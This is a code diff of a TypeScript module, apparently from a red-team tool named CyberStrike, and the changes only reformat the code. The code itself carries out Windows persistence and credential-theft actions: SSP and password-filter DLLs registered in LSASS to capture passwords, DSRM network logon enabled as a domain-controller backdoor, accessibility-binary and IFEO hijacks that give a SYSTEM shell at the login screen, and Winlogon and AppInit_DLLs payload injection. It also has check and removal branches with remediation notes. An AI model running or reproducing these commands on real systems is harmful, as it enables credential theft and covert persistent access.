@@ -1966,8 +2229,22 @@ export async function sspPersist(args: string[], timeout: number): Promise<HookR
         const current = r.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || ""
         const addCmd = `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "${current}\\0${dllName}" /f`
         const add = await cmd(addCmd, timeout)
-        output.push(add.exitCode === 0 ? `[+] SSP '${dllName}' added to registry — reboot required` : `[!] Registry add failed: ${add.stderr}`)
-        if (add.exitCode === 0) findings.push({ checkId: "WIN-SSP-010", provider: "windows", severity: "critical", status: "INSTALLED", resource: `lsa://ssp/${name}`, title: `SSP installed: ${name}`, details: `SSP DLL registered via registry. Captures credentials after reboot.`, remediation: `Remove from Security Packages registry.` })
+        output.push(
+          add.exitCode === 0
+            ? `[+] SSP '${dllName}' added to registry — reboot required`
+            : `[!] Registry add failed: ${add.stderr}`,
+        )
+        if (add.exitCode === 0)
+          findings.push({
+            checkId: "WIN-SSP-010",
+            provider: "windows",
+            severity: "critical",
+            status: "INSTALLED",
+            resource: `lsa://ssp/${name}`,
+            title: `SSP installed: ${name}`,
+            details: `SSP DLL registered via registry. Captures credentials after reboot.`,
+            remediation: `Remove from Security Packages registry.`,
+          })
       } else {
         output.push("[*] API-based SSP loading requires PS — use registry method or PS exec mode")
       }
@@ -2283,7 +2560,10 @@ export async function passwordFilter(args: string[], timeout: number): Promise<H
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Password Filter (cmd.exe) ===\n")
     if (action === "enum") {
-      const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`, timeout)
+      const r = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`,
+        timeout,
+      )
       output.push("[*] Notification Packages:\n" + (r.stdout || "(query failed)"))
       const ppl = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "RunAsPPL"`, timeout)
       output.push(`\n[*] LSASS PPL: ${ppl.exitCode === 0 && ppl.stdout.includes("0x1") ? "ENABLED" : "DISABLED"}`)
@@ -2291,15 +2571,38 @@ export async function passwordFilter(args: string[], timeout: number): Promise<H
       output.push("\n[*] Password policy:\n" + policy.stdout)
     }
     if (action === "install") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const dllName = dll.replace(/\\/g, "/").split("/").pop()?.replace(".dll", "") || filterName
       const copy = await cmd(`copy "${dll}" "%SystemRoot%\\System32\\" /Y`, timeout)
       output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
-      const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`, timeout)
+      const r = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages"`,
+        timeout,
+      )
       const current = r.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim() || ""
-      const add = await cmd(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "${current}\\0${dllName}" /f`, timeout)
-      output.push(add.exitCode === 0 ? `[+] Password filter '${dllName}' registered — reboot required\n[*] After reboot, every password change is captured` : `[!] Registry failed: ${add.stderr}`)
-      if (add.exitCode === 0) findings.push({ checkId: "WIN-PF-010", provider: "windows", severity: "critical", status: "INSTALLED", resource: `lsa://password-filter/${filterName}`, title: `Password filter installed: ${filterName}`, details: "Filter loads into LSASS on next boot. All password changes captured.", remediation: `Remove from Notification Packages registry.` })
+      const add = await cmd(
+        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "${current}\\0${dllName}" /f`,
+        timeout,
+      )
+      output.push(
+        add.exitCode === 0
+          ? `[+] Password filter '${dllName}' registered — reboot required\n[*] After reboot, every password change is captured`
+          : `[!] Registry failed: ${add.stderr}`,
+      )
+      if (add.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PF-010",
+          provider: "windows",
+          severity: "critical",
+          status: "INSTALLED",
+          resource: `lsa://password-filter/${filterName}`,
+          title: `Password filter installed: ${filterName}`,
+          details: "Filter loads into LSASS on next boot. All password changes captured.",
+          remediation: `Remove from Notification Packages registry.`,
+        })
     }
     if (action === "remove") {
       output.push("[*] To remove password filter via cmd.exe:")
@@ -2492,35 +2795,84 @@ export async function dsrmAbuse(args: string[], timeout: number): Promise<HookRe
     const domainRole = parseInt(dcCheck.stdout.match(/DomainRole=(\d+)/)?.[1] || "0")
     const isDC = domainRole >= 4
     output.push(`[*] DomainRole: ${domainRole} — ${isDC ? "Domain Controller" : "NOT a DC"}`)
-    if (!isDC) { output.push("[-] DSRM attacks only apply to Domain Controllers"); return { output: output.join("\n"), findings } }
+    if (!isDC) {
+      output.push("[-] DSRM attacks only apply to Domain Controllers")
+      return { output: output.join("\n"), findings }
+    }
 
     if (action === "check") {
-      const dsrm = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior"`, timeout)
+      const dsrm = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior"`,
+        timeout,
+      )
       const behavior = dsrm.stdout.match(/0x(\d+)/)?.[1] || "not set"
       output.push(`\n[*] DsrmAdminLogonBehavior: ${behavior}`)
       if (behavior === "2") {
         output.push("[!] Value 2 — DSRM admin can logon ANYTIME via network (EXPLOITABLE)")
-        findings.push({ checkId: "WIN-DSRM-001", provider: "windows", severity: "critical", status: "EXPLOITABLE", resource: "dc://dsrm", title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)", details: "DSRM admin can log on via network anytime. Persistent DC access.", remediation: "Set DsrmAdminLogonBehavior to 0." })
+        findings.push({
+          checkId: "WIN-DSRM-001",
+          provider: "windows",
+          severity: "critical",
+          status: "EXPLOITABLE",
+          resource: "dc://dsrm",
+          title: "DSRM network logon enabled (DsrmAdminLogonBehavior=2)",
+          details: "DSRM admin can log on via network anytime. Persistent DC access.",
+          remediation: "Set DsrmAdminLogonBehavior to 0.",
+        })
       } else {
         output.push(`[*] Default/secure — DSRM admin restricted`)
-        findings.push({ checkId: "WIN-DSRM-002", provider: "windows", severity: "medium", status: "INFO", resource: "dc://dsrm", title: "DC found — DSRM network logon can be enabled", details: "Use --action enable-network to enable DSRM network logon.", remediation: "Monitor DsrmAdminLogonBehavior for changes." })
+        findings.push({
+          checkId: "WIN-DSRM-002",
+          provider: "windows",
+          severity: "medium",
+          status: "INFO",
+          resource: "dc://dsrm",
+          title: "DC found — DSRM network logon can be enabled",
+          details: "Use --action enable-network to enable DSRM network logon.",
+          remediation: "Monitor DsrmAdminLogonBehavior for changes.",
+        })
       }
       const ntdsutil = await cmd("where ntdsutil", timeout)
       output.push(`\n[*] ntdsutil available: ${ntdsutil.exitCode === 0 ? "YES" : "NO"}`)
     }
     if (action === "enable-network") {
-      const r = await cmd(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`, timeout)
-      output.push(r.exitCode === 0 ? "[+] DsrmAdminLogonBehavior set to 2\n[+] DSRM admin can now logon via network" : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-DSRM-010", provider: "windows", severity: "critical", status: "BACKDOORED", resource: "dc://dsrm", title: "DSRM network logon enabled — persistent DC backdoor", details: "DsrmAdminLogonBehavior=2. Sync password for persistent access.", remediation: "Set to 0. Rotate DSRM password." })
+      const r = await cmd(
+        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f`,
+        timeout,
+      )
+      output.push(
+        r.exitCode === 0
+          ? "[+] DsrmAdminLogonBehavior set to 2\n[+] DSRM admin can now logon via network"
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-DSRM-010",
+          provider: "windows",
+          severity: "critical",
+          status: "BACKDOORED",
+          resource: "dc://dsrm",
+          title: "DSRM network logon enabled — persistent DC backdoor",
+          details: "DsrmAdminLogonBehavior=2. Sync password for persistent access.",
+          remediation: "Set to 0. Rotate DSRM password.",
+        })
     }
     if (action === "sync-password") {
-      if (!syncAccount) { output.push("ERROR: --sync-account required"); return { output: output.join("\n"), findings } }
+      if (!syncAccount) {
+        output.push("ERROR: --sync-account required")
+        return { output: output.join("\n"), findings }
+      }
       const r = await cmd(`ntdsutil "set dsrm password" "sync from domain account ${syncAccount}" quit quit`, timeout)
       output.push(r.stdout || r.stderr)
-      output.push(r.stdout.includes("successfully") ? `[+] DSRM password synced with ${syncAccount}` : "[!] Sync may have failed")
+      output.push(
+        r.stdout.includes("successfully") ? `[+] DSRM password synced with ${syncAccount}` : "[!] Sync may have failed",
+      )
     }
     if (action === "disable") {
-      const r = await cmd(`reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /f`, timeout)
+      const r = await cmd(
+        `reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "DsrmAdminLogonBehavior" /f`,
+        timeout,
+      )
       output.push(r.exitCode === 0 ? "[+] DsrmAdminLogonBehavior removed (defaults to 0)" : `[!] Failed: ${r.stderr}`)
     }
     return { output: output.join("\n"), findings }
@@ -2755,14 +3107,20 @@ export async function accessibilityBackdoor(args: string[], timeout: number): Pr
     if (action === "check") {
       for (const [name, info] of Object.entries(targets)) {
         const targetPath = `%SystemRoot%\\System32\\${info.exe}`
-        const ifeo = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${info.exe}" /v "Debugger"`, timeout)
+        const ifeo = await cmd(
+          `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${info.exe}" /v "Debugger"`,
+          timeout,
+        )
         if (ifeo.exitCode === 0) {
           output.push(`[!] ${info.exe} — IFEO Debugger set: ${ifeo.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim()}`)
         }
         const exists = await cmd(`if exist "${targetPath}" (echo EXISTS) else (echo MISSING)`, timeout)
         output.push(`[*] ${info.exe} — ${exists.stdout.includes("EXISTS") ? "present" : "MISSING"} (${info.trigger})`)
       }
-      const rdp = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v "fDenyTSConnections"`, timeout)
+      const rdp = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v "fDenyTSConnections"`,
+        timeout,
+      )
       output.push(`\n[*] RDP: ${rdp.stdout.includes("0x0") ? "ENABLED" : "DISABLED"}`)
     }
     if (action === "install") {
@@ -2779,12 +3137,36 @@ export async function accessibilityBackdoor(args: string[], timeout: number): Pr
         output.push(`[+] ${t.exe} replaced with ${payload}`)
         output.push(`[+] Trigger: ${t.trigger}`)
         output.push(`[+] Result: SYSTEM shell at login screen`)
-        findings.push({ checkId: "WIN-ACC-010", provider: "windows", severity: "critical", status: "BACKDOORED", resource: `accessibility://${target}`, title: `Accessibility backdoor: ${t.exe} → ${payload}`, details: `${t.trigger} spawns ${payload} as SYSTEM.`, remediation: `Restore: copy "${backupPath}" "${targetPath}" /Y` })
+        findings.push({
+          checkId: "WIN-ACC-010",
+          provider: "windows",
+          severity: "critical",
+          status: "BACKDOORED",
+          resource: `accessibility://${target}`,
+          title: `Accessibility backdoor: ${t.exe} → ${payload}`,
+          details: `${t.trigger} spawns ${payload} as SYSTEM.`,
+          remediation: `Restore: copy "${backupPath}" "${targetPath}" /Y`,
+        })
       } else {
         output.push(`[!] Copy failed — trying IFEO debugger method...`)
-        const ifeo = await cmd(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /t REG_SZ /d "%SystemRoot%\\System32\\${payload}" /f`, timeout)
-        output.push(ifeo.exitCode === 0 ? `[+] IFEO debugger set: ${t.exe} → ${payload}` : `[!] IFEO failed: ${ifeo.stderr}`)
-        if (ifeo.exitCode === 0) findings.push({ checkId: "WIN-ACC-010", provider: "windows", severity: "critical", status: "BACKDOORED", resource: `accessibility://${target}`, title: `IFEO backdoor: ${t.exe} → ${payload}`, details: `${t.trigger} spawns ${payload}.`, remediation: `Remove: reg delete "HKLM\\...\\Image File Execution Options\\${t.exe}" /v "Debugger" /f` })
+        const ifeo = await cmd(
+          `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /t REG_SZ /d "%SystemRoot%\\System32\\${payload}" /f`,
+          timeout,
+        )
+        output.push(
+          ifeo.exitCode === 0 ? `[+] IFEO debugger set: ${t.exe} → ${payload}` : `[!] IFEO failed: ${ifeo.stderr}`,
+        )
+        if (ifeo.exitCode === 0)
+          findings.push({
+            checkId: "WIN-ACC-010",
+            provider: "windows",
+            severity: "critical",
+            status: "BACKDOORED",
+            resource: `accessibility://${target}`,
+            title: `IFEO backdoor: ${t.exe} → ${payload}`,
+            details: `${t.trigger} spawns ${payload}.`,
+            remediation: `Remove: reg delete "HKLM\\...\\Image File Execution Options\\${t.exe}" /v "Debugger" /f`,
+          })
       }
     }
     if (action === "remove") {
@@ -2792,9 +3174,19 @@ export async function accessibilityBackdoor(args: string[], timeout: number): Pr
       const targetPath = `%SystemRoot%\\System32\\${t.exe}`
       await cmd(`takeown /f "${targetPath}" /a`, timeout)
       await cmd(`icacls "${targetPath}" /grant Administrators:F`, timeout)
-      const restore = await cmd(`if exist "${backupPath}" (copy "${backupPath}" "${targetPath}" /Y && del "${backupPath}") else (echo NO_BACKUP)`, timeout)
-      output.push(restore.stdout.includes("NO_BACKUP") ? "[*] No backup found — restore from WinSxS manually" : `[+] ${t.exe} restored from backup`)
-      await cmd(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /f`, timeout)
+      const restore = await cmd(
+        `if exist "${backupPath}" (copy "${backupPath}" "${targetPath}" /Y && del "${backupPath}") else (echo NO_BACKUP)`,
+        timeout,
+      )
+      output.push(
+        restore.stdout.includes("NO_BACKUP")
+          ? "[*] No backup found — restore from WinSxS manually"
+          : `[+] ${t.exe} restored from backup`,
+      )
+      await cmd(
+        `reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${t.exe}" /v "Debugger" /f`,
+        timeout,
+      )
       output.push("[+] IFEO debugger removed (if existed)")
     }
     return { output: output.join("\n"), findings }
@@ -3004,35 +3396,78 @@ export async function ifeoPersist(args: string[], timeout: number): Promise<Hook
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== IFEO Persistence (cmd.exe) ===\n")
     if (action === "enum") {
-      const r = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "Debugger"`, timeout)
+      const r = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "Debugger"`,
+        timeout,
+      )
       output.push("[*] IFEO Debugger entries:\n" + (r.stdout || "(none found)"))
-      const r2 = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "GlobalFlag"`, timeout)
+      const r2 = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" /s /v "GlobalFlag"`,
+        timeout,
+      )
       if (r2.exitCode === 0 && r2.stdout.includes("GlobalFlag")) output.push("\n[*] GlobalFlag entries:\n" + r2.stdout)
       const debuggerCount = (r.stdout.match(/Debugger/g) || []).length
-      if (debuggerCount > 0) findings.push({ checkId: "WIN-IFEO-001", provider: "windows", severity: "high", status: "SUSPICIOUS", resource: "registry://ifeo", title: `${debuggerCount} IFEO debugger entries found`, details: "IFEO entries redirect process execution. Review for malicious entries.", remediation: "Remove suspicious Debugger values from IFEO." })
+      if (debuggerCount > 0)
+        findings.push({
+          checkId: "WIN-IFEO-001",
+          provider: "windows",
+          severity: "high",
+          status: "SUSPICIOUS",
+          resource: "registry://ifeo",
+          title: `${debuggerCount} IFEO debugger entries found`,
+          details: "IFEO entries redirect process execution. Review for malicious entries.",
+          remediation: "Remove suspicious Debugger values from IFEO.",
+        })
     }
     if (action === "install") {
-      if (!targetProc || !payloadPath) { output.push("ERROR: --target and --payload required"); return { output: output.join("\n"), findings } }
+      if (!targetProc || !payloadPath) {
+        output.push("ERROR: --target and --payload required")
+        return { output: output.join("\n"), findings }
+      }
       const ifeoKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}`
       if (method === "debugger") {
         const r = await cmd(`reg add "${ifeoKey}" /v "Debugger" /t REG_SZ /d "${payloadPath}" /f`, timeout)
-        output.push(r.exitCode === 0 ? `[+] IFEO Debugger set: ${targetProc} → ${payloadPath}\n[*] Payload runs INSTEAD of target` : `[!] Failed: ${r.stderr}`)
+        output.push(
+          r.exitCode === 0
+            ? `[+] IFEO Debugger set: ${targetProc} → ${payloadPath}\n[*] Payload runs INSTEAD of target`
+            : `[!] Failed: ${r.stderr}`,
+        )
       }
       if (method === "silent-exit") {
         await cmd(`reg add "${ifeoKey}" /v "GlobalFlag" /t REG_DWORD /d 512 /f`, timeout)
         const silentKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}`
         await cmd(`reg add "${silentKey}" /v "ReportingMode" /t REG_DWORD /d 1 /f`, timeout)
         const r = await cmd(`reg add "${silentKey}" /v "MonitorProcess" /t REG_SZ /d "${payloadPath}" /f`, timeout)
-        output.push(r.exitCode === 0 ? `[+] SilentProcessExit set: ${targetProc}\n[*] Payload triggers WHEN target exits (stealthier)` : `[!] Failed: ${r.stderr}`)
+        output.push(
+          r.exitCode === 0
+            ? `[+] SilentProcessExit set: ${targetProc}\n[*] Payload triggers WHEN target exits (stealthier)`
+            : `[!] Failed: ${r.stderr}`,
+        )
       }
-      if (output.some((o) => o.includes("[+]"))) findings.push({ checkId: "WIN-IFEO-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `ifeo://${targetProc}`, title: `IFEO persistence: ${targetProc} → ${payloadPath} (${method})`, details: `${method === "debugger" ? "Runs instead of target" : "Triggers on target exit"}. Persists across reboots.`, remediation: `Remove: reg delete "${ifeoKey}" /v Debugger /f` })
+      if (output.some((o) => o.includes("[+]")))
+        findings.push({
+          checkId: "WIN-IFEO-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `ifeo://${targetProc}`,
+          title: `IFEO persistence: ${targetProc} → ${payloadPath} (${method})`,
+          details: `${method === "debugger" ? "Runs instead of target" : "Triggers on target exit"}. Persists across reboots.`,
+          remediation: `Remove: reg delete "${ifeoKey}" /v Debugger /f`,
+        })
     }
     if (action === "remove") {
-      if (!targetProc) { output.push("ERROR: --target required"); return { output: output.join("\n"), findings } }
+      if (!targetProc) {
+        output.push("ERROR: --target required")
+        return { output: output.join("\n"), findings }
+      }
       const ifeoKey = `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}`
       await cmd(`reg delete "${ifeoKey}" /v "Debugger" /f`, timeout)
       await cmd(`reg delete "${ifeoKey}" /v "GlobalFlag" /f`, timeout)
-      await cmd(`reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}" /f`, timeout)
+      await cmd(
+        `reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}" /f`,
+        timeout,
+      )
       output.push(`[+] IFEO persistence removed for ${targetProc}`)
     }
     return { output: output.join("\n"), findings }
@@ -3273,22 +3708,44 @@ export async function winlogonPersist(args: string[], timeout: number): Promise<
       const shellVal = shell.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
       const userinitVal = userinit.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
       if (shellVal && shellVal !== "explorer.exe") output.push("[!] Shell NON-DEFAULT — possible persistence")
-      if (userinitVal && !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i)) output.push("[!] Userinit NON-DEFAULT — possible persistence")
-      if (shellVal !== "explorer.exe" || !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i)) findings.push({ checkId: "WIN-WLGN-001", provider: "windows", severity: "high", status: "SUSPICIOUS", resource: "registry://winlogon", title: "Non-default Winlogon values — possible persistence", details: `Shell: ${shellVal}, Userinit: ${userinitVal}`, remediation: "Verify non-default values. Restore defaults if malicious." })
+      if (userinitVal && !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i))
+        output.push("[!] Userinit NON-DEFAULT — possible persistence")
+      if (shellVal !== "explorer.exe" || !userinitVal.match(/^C:\\Windows\\system32\\userinit\.exe,?\s*$/i))
+        findings.push({
+          checkId: "WIN-WLGN-001",
+          provider: "windows",
+          severity: "high",
+          status: "SUSPICIOUS",
+          resource: "registry://winlogon",
+          title: "Non-default Winlogon values — possible persistence",
+          details: `Shell: ${shellVal}, Userinit: ${userinitVal}`,
+          remediation: "Verify non-default values. Restore defaults if malicious.",
+        })
     }
     if (action === "install") {
-      if (!payload) { output.push("ERROR: --payload required"); return { output: output.join("\n"), findings } }
+      if (!payload) {
+        output.push("ERROR: --payload required")
+        return { output: output.join("\n"), findings }
+      }
       if (key === "userinit") {
         const current = await cmd(`reg query "${winlogonCmd}" /v "Userinit"`, timeout)
         const curVal = current.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "C:\\Windows\\system32\\userinit.exe,"
         const newVal = `${curVal}${payload},`
         const r = await cmd(`reg add "${winlogonCmd}" /v "Userinit" /t REG_SZ /d "${newVal}" /f`, timeout)
-        output.push(r.exitCode === 0 ? `[+] Userinit updated: ${newVal}\n[*] Payload runs at every logon in SYSTEM context` : `[!] Failed: ${r.stderr}`)
+        output.push(
+          r.exitCode === 0
+            ? `[+] Userinit updated: ${newVal}\n[*] Payload runs at every logon in SYSTEM context`
+            : `[!] Failed: ${r.stderr}`,
+        )
       }
       if (key === "shell") {
         const newVal = `${payload},explorer.exe`
         const r = await cmd(`reg add "${winlogonCmd}" /v "Shell" /t REG_SZ /d "${newVal}" /f`, timeout)
-        output.push(r.exitCode === 0 ? `[+] Shell updated: ${newVal}\n[*] Payload runs first, then explorer loads` : `[!] Failed: ${r.stderr}`)
+        output.push(
+          r.exitCode === 0
+            ? `[+] Shell updated: ${newVal}\n[*] Payload runs first, then explorer loads`
+            : `[!] Failed: ${r.stderr}`,
+        )
       }
       if (key === "notify") {
         const notifyKey = `${winlogonCmd}\\Notify\\CyberStrike`
@@ -3298,10 +3755,24 @@ export async function winlogonPersist(args: string[], timeout: number): Promise<
         const r = await cmd(`reg add "${notifyKey}" /v "Asynchronous" /t REG_DWORD /d 1 /f`, timeout)
         output.push(r.exitCode === 0 ? `[+] Winlogon Notify DLL registered: ${payload}` : `[!] Failed: ${r.stderr}`)
       }
-      if (output.some((o) => o.includes("[+]"))) findings.push({ checkId: "WIN-WLGN-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `winlogon://${key}`, title: `Winlogon ${key} persistence: ${payload}`, details: `Executes at every logon in SYSTEM context.`, remediation: `Restore: reg add "${winlogonCmd}" /v "${key === "userinit" ? "Userinit" : "Shell"}" /t REG_SZ /d "${key === "userinit" ? "C:\\Windows\\system32\\userinit.exe," : "explorer.exe"}" /f` })
+      if (output.some((o) => o.includes("[+]")))
+        findings.push({
+          checkId: "WIN-WLGN-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `winlogon://${key}`,
+          title: `Winlogon ${key} persistence: ${payload}`,
+          details: `Executes at every logon in SYSTEM context.`,
+          remediation: `Restore: reg add "${winlogonCmd}" /v "${key === "userinit" ? "Userinit" : "Shell"}" /t REG_SZ /d "${key === "userinit" ? "C:\\Windows\\system32\\userinit.exe," : "explorer.exe"}" /f`,
+        })
     }
     if (action === "restore") {
-      if (key === "userinit") await cmd(`reg add "${winlogonCmd}" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe," /f`, timeout)
+      if (key === "userinit")
+        await cmd(
+          `reg add "${winlogonCmd}" /v "Userinit" /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe," /f`,
+          timeout,
+        )
       if (key === "shell") await cmd(`reg add "${winlogonCmd}" /v "Shell" /t REG_SZ /d "explorer.exe" /f`, timeout)
       if (key === "notify") await cmd(`reg delete "${winlogonCmd}\\Notify\\CyberStrike" /f`, timeout)
       output.push(`[+] Winlogon ${key} restored to default`)
@@ -3500,34 +3971,77 @@ export async function appinitDll(args: string[], timeout: number): Promise<HookR
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== AppInit_DLLs Persistence (cmd.exe) ===\n")
     if (action === "enum") {
-      const native = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`, timeout)
-      const load = await cmd(`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs"`, timeout)
+      const native = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`,
+        timeout,
+      )
+      const load = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "LoadAppInit_DLLs"`,
+        timeout,
+      )
       output.push("[*] Native (64-bit):")
       output.push(`    AppInit_DLLs: ${native.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || "(empty)"}`)
       output.push(`    LoadAppInit_DLLs: ${load.stdout.match(/0x(\d+)/)?.[1] || "0"}`)
-      if (load.stdout.includes("0x1")) output.push("    [!] Loading ENABLED — DLLs injected into all User32.dll processes")
-      const wow = await cmd(`reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`, timeout)
+      if (load.stdout.includes("0x1"))
+        output.push("    [!] Loading ENABLED — DLLs injected into all User32.dll processes")
+      const wow = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v "AppInit_DLLs"`,
+        timeout,
+      )
       if (wow.exitCode === 0) {
         output.push("\n[*] Wow64 (32-bit):")
         output.push(`    AppInit_DLLs: ${wow.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || "(empty)"}`)
       }
-      if (load.stdout.includes("0x1")) findings.push({ checkId: "WIN-APPI-001", provider: "windows", severity: "high", status: "ENABLED", resource: "registry://appinit", title: "AppInit_DLLs loading enabled", details: "DLLs in AppInit_DLLs injected into all GUI processes.", remediation: "Set LoadAppInit_DLLs to 0." })
+      if (load.stdout.includes("0x1"))
+        findings.push({
+          checkId: "WIN-APPI-001",
+          provider: "windows",
+          severity: "high",
+          status: "ENABLED",
+          resource: "registry://appinit",
+          title: "AppInit_DLLs loading enabled",
+          details: "DLLs in AppInit_DLLs injected into all GUI processes.",
+          remediation: "Set LoadAppInit_DLLs to 0.",
+        })
     }
     if (action === "install") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const current = await cmd(`reg query "${regPathCmd}" /v "AppInit_DLLs"`, timeout)
       const curVal = current.stdout.match(/REG_SZ\s+(.*)/)?.[1]?.trim() || ""
       const newVal = curVal ? `${curVal} ${dll}` : dll
       await cmd(`reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "${newVal}" /f`, timeout)
       const r = await cmd(`reg add "${regPathCmd}" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] AppInit_DLLs: ${newVal}\n[+] LoadAppInit_DLLs: 1\n[*] DLL injected into all new User32.dll processes` : `[!] Failed: ${r.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-APPI-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `appinit://${scope}`, title: `AppInit_DLLs: ${dll} (${scope})`, details: "DLL injected into every User32 process. Persists across reboots.", remediation: `Remove: reg add "${regPathCmd}" /v "AppInit_DLLs" /t REG_SZ /d "" /f` })
+      output.push(
+        r.exitCode === 0
+          ? `[+] AppInit_DLLs: ${newVal}\n[+] LoadAppInit_DLLs: 1\n[*] DLL injected into all new User32.dll processes`
+          : `[!] Failed: ${r.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-APPI-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `appinit://${scope}`,
+          title: `AppInit_DLLs: ${dll} (${scope})`,
